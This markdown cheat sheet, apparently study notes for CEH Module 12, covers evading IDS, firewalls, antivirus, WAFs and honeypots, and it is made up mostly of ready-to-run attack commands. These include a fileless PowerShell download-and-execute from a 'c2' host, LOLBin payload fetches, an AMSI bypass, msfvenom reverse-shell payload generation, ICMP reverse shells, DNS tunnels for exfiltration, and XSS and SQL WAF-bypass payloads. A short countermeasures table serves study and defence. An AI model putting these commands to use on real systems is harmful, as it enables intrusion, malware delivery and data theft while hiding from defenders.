# Evasion Techniques (IDS, Firewall, AV & Honeypot Bypass)

> For authorized security testing, red team exercises, and educational study only.

Techniques for bypassing intrusion detection systems, firewalls, antivirus engines, WAFs, and honeypots — CEH v13 Module 12.

---

## IDS Evasion

```bash
# Fragmentation — tiny fragments split headers across packets
nmap -f <target>                    # 8-byte fragments
nmap -ff <target>                   # 16-byte fragments
nmap --mtu 24 <target>              # custom fragment size (must be multiple of 8)

# Overlapping fragments — different reassembly policies = different results
# Linux favors first fragment, Windows favors last fragment
fragroute -f overlap.conf <target>

# TTL manipulation — packets expire after passing IDS but before target
# set TTL so IDS sees packet (and accepts) but it dies before reaching host
hping3 -t 10 -S -p 80 <target>     # TTL=10

# Session splicing — split payload across many small TCP segments
nmap --data-length 5 <target>       # append random data to change size
hping3 -S -p 80 -d 2 <target>      # 2-byte data per packet

# Unicode / polymorphic encoding
# URL-encode or Unicode-encode attack strings to evade pattern matching
# Example: /etc/passwd -> %2Fetc%2Fpasswd -> %252Fetc%252Fpasswd

# Encrypted tunnels — IDS cannot inspect encrypted payloads
ssh -D 1080 user@pivot              # SOCKS proxy via SSH
stunnel                              # TLS wrapper for arbitrary TCP
```

## Firewall Evasion

```bash
# IP source routing — specify route through network (often blocked)
hping3 --lsrr 10.0.0.1 -S -p 80 <target>   # loose source routing
nmap --ip-options "L 10.0.0.1" <target>

# HTTP tunneling
# Wrap traffic inside HTTP requests to pass through port-80-only firewalls
httptunnel:
  hts -F localhost:22 80            # server side: forward port 80 -> 22
  htc -F 2222 <server>:80          # client side: local 2222 -> server 80

# DNS tunneling
iodine -f -P password 10.0.0.1 tunnel.example.com   # client
iodined -f -P password 10.0.0.1/24 tunnel.example.com  # server
dnscat2-client tunnel.example.com
dns2tcp -z tunnel.example.com -r ssh -l 2222

# ICMP tunneling
icmpsh -t <target> -d 500 -b 64    # reverse ICMP shell
ptunnel -p <proxy> -lp 8000 -da <dest> -dp 22  # TCP over ICMP

# Port hopping — switch ports mid-session to evade stateful filters
# Implemented in C2 frameworks (Cobalt Strike, Metasploit)

# Covert channels — hide data in protocol fields
# TCP urgent pointer, IP ID field, TCP ISN, HTTP headers
```

## Honeypot Detection

```bash
# Shodan honeyscore — query Shodan for honeypot probability
curl "https://api.shodan.io/labs/honeyscore/<IP>?key=<API_KEY>"
# Score 0.0-1.0 (>0.5 likely honeypot)

# Timing analysis
# Honeypots often have unnaturally consistent response times
# Real systems show variable latency under load

# Probe responses — look for inconsistencies
nmap -sV -O <target>                # OS vs service version mismatches
# Signs: too many open ports, default banners, impossible OS/service combos
# Low-interaction honeypots respond identically to varied inputs
# Check for known honeypot signatures (Kippo, Cowrie, Dionaea defaults)

# Fingerprinting honeypot software
# Cowrie SSH: specific key exchange algorithms, banner patterns
# Dionaea: accepts connections on unusual port combinations
# HoneyD: TCP/IP stack inconsistencies vs claimed OS
```

## WAF Bypass

```bash
# URL encoding
# Single:  <script> -> %3Cscript%3E
# Double:  <script> -> %253Cscript%253E
# Unicode: <script> -> %u003Cscript%u003E

# HTTP Parameter Pollution (HPP)
# Duplicate parameters — WAF checks first, app uses last (or vice versa)
GET /search?q=safe&q=<script>alert(1)</script>

# Chunked transfer encoding — split body to evade pattern matching
POST /target HTTP/1.1
Transfer-Encoding: chunked

3
scr
3
ipt

# HTTP verb tampering — some WAFs only filter GET/POST
curl -X PATCH <target> -d "payload=<script>alert(1)</script>"
# Try: PUT, DELETE, PATCH, OPTIONS, TRACE

# Wildcard / globbing payloads (Linux command injection)
# cat /etc/passwd -> /???/??t /???/??ss??
# Bypass keyword filters with ? and * wildcards

# Case variation and null bytes
<ScRiPt>alert(1)</ScRiPt>
<scr%00ipt>alert(1)</scr%00ipt>

# Comment insertion (SQL)
SEL/**/ECT * FR/**/OM users
```

## AV Evasion

```bash
# Packing — compress/encrypt executable, unpack at runtime
upx -9 payload.exe                  # UPX packer (well-known, often detected)

# Crypting — encrypt payload, stub decrypts in memory
# Custom crypters > public crypters (signatures known)

# Polymorphic / metamorphic code
# Polymorphic: encrypted payload + mutating decryptor stub
# Metamorphic: entire code rewrites itself each generation

# Fileless malware — execute entirely in memory
powershell -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/ps.ps1')"

# Living-off-the-Land Binaries (LOLBins)
certutil -urlcache -split -f http://c2/payload.exe %tmp%\p.exe
mshta http://c2/payload.hta
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";eval('...')
regsvr32 /s /n /u /i:http://c2/file.sct scrobj.dll

# AMSI bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Note: specific bypasses rotate as Microsoft patches them
```

## Network Evasion Tools

```bash
# fragroute — intercept and fragment outbound traffic
fragroute -f frag.conf <target>
# Config: ip_frag 8 / ip_chaff dup / tcp_seg 4

# nmap evasion options
nmap -f -D RND:10 --data-length 50 -T2 --randomize-hosts <target>
# -f: fragment  -D: decoys  -T2: slow timing  --data-length: pad packets

# hping3 — craft custom packets
hping3 -S -p 80 --frag --mtu 16 <target>
hping3 -c 1 -S -p 80 --spoof <spoofed_ip> <target>

# proxychains — chain SOCKS/HTTP proxies
proxychains nmap -sT -Pn <target>   # -sT required (full connect)
# Config: /etc/proxychains.conf -> socks5 127.0.0.1 9050

# Tor
torify curl http://<target>
proxychains -f tor.conf nmap -sT <target>
```

## Payload Evasion Tools

```bash
# msfvenom encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
# -e encoder  -i iterations  (multiple iterations = more mutation)

# Veil-Evasion — generate AV-evading payloads
veil -t Evasion -p python/meterpreter/rev_tcp --ip <ip> --port 4444

# Shelter — dynamic shellcode injection into legit PE files
shelter -f legit.exe -s payload.bin

# Custom shellcode — handwritten > generated (no known signatures)
msfvenom -p windows/exec CMD=calc.exe -f c  # raw shellcode to customize
# XOR, AES, or custom encoding before injection
```

## DNS Tunneling Tools

```bash
# iodine — IP-over-DNS tunnel
iodined -f -c -P pass 10.0.0.1/24 t.example.com   # server (needs root)
iodine -f -P pass t.example.com                     # client

# dnscat2 — encrypted C2 over DNS
# Server:
ruby dnscat2.rb t.example.com
# Client:
./dnscat --dns domain=t.example.com

# dns2tcp — TCP over DNS
# Server config: /etc/dns2tcpd.conf (resources = ssh, http)
dns2tcpd -f /etc/dns2tcpd.conf
# Client:
dns2tcpc -z t.example.com -r ssh -l 2222 <server>
ssh -p 2222 user@127.0.0.1
```

## ICMP Tunneling Tools

```bash
# icmpsh — reverse ICMP shell (no root on target needed on Windows)
# Attacker (Linux):
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python icmpsh_m.py <attacker_ip> <target_ip>
# Target (Windows):
icmpsh.exe -t <attacker_ip>

# ptunnel — TCP-over-ICMP proxy
ptunnel -p <proxy_host>                              # proxy server
ptunnel -p <proxy_host> -lp 8000 -da <dest> -dp 22  # client
ssh -p 8000 user@127.0.0.1                           # use the tunnel
```

## Covert Channels

```bash
# TCP header manipulation
# Hide data in: IP ID field, TCP ISN, TCP urgent pointer, IP options
# Tool: covert_tcp — encode data in TCP/IP headers
./covert_tcp -source <src> -dest <dst> -file secret.txt

# HTTP header covert channels
# Embed data in X-Custom-Header, Cookie values, ETag, etc.
curl -H "X-Data: $(base64 secret.txt)" http://<target>/innocent

# Steganographic network channels
# Embed data in timing (inter-packet delay encodes bits)
# Embed in packet sizes, TCP window sizes, or DNS query patterns

# NUSHU / TCP window size channel
# Modulate TCP window size to encode covert bits
```

## Countermeasures

```
Deep Packet Inspection (DPI)    Inspect payload content beyond headers; defeats simple tunneling
Behavioral / anomaly analysis   Baseline normal traffic; flag deviations (unusual DNS volume, ICMP size)
Sandboxing                      Detonate suspicious files in isolated environment before delivery
Protocol normalization           Reassemble fragments, decode encodings before inspection
SSL/TLS inspection              Man-in-the-middle decryption at network boundary (requires CA trust)
Deception technology            Deploy honeypots/honeynets; detect attackers probing decoys
Heuristic AV engines            Detect packed/crypted binaries by entropy analysis and emulation
Network traffic analysis (NTA)  ML-based detection of tunneling, beaconing, and exfiltration
AMSI integration                Scan scripts at runtime before execution (PowerShell, VBA, JS)
EDR / XDR                       Endpoint telemetry + behavioral detection across kill chain
```

---

## Tips

- Layer evasion: combine fragmentation + encoding + timing + encryption for best results
- Test payloads against target AV/IDS in a lab before engagement (use VirusTotal alternatives to avoid signature submission)
- Custom > public tools: known tools have known signatures
- Slow and low: timing-based evasion (`nmap -T0/T1`) avoids rate-based detection
- Know the reassembly policy: Linux (first fragment wins) vs Windows (last fragment wins) determines overlap strategy
- WAF bypass is version-specific: always fingerprint the WAF first (`wafw00f`)
- DNS tunneling generates abnormal query volume — use low-frequency exfil to avoid NTA alerts
- LOLBins are powerful because they are signed Microsoft binaries — harder to block without breaking functionality

## See Also

- `sheets/offensive/scanning-enumeration.md` — nmap evasion flags in scanning context
- `sheets/offensive/malware-threats.md` — malware analysis and payload types
- `sheets/defensive/ids-ips-firewalls.md` — detection side of evasion techniques
- `sheets/offensive/social-engineering.md` — delivery mechanisms for evasive payloads

## References

- CEH v13 Module 12: Evading IDS, Firewalls, and Honeypots
- NIST SP 800-94: Guide to Intrusion Detection and Prevention Systems
- MITRE ATT&CK — Defense Evasion (TA0005): https://attack.mitre.org/tactics/TA0005/
- LOLBAS Project: https://lolbas-project.github.io/
- fragroute(8) man page
- Ptacek & Newsham, "Insertion, Evasion, and Denial of Service" (1998)
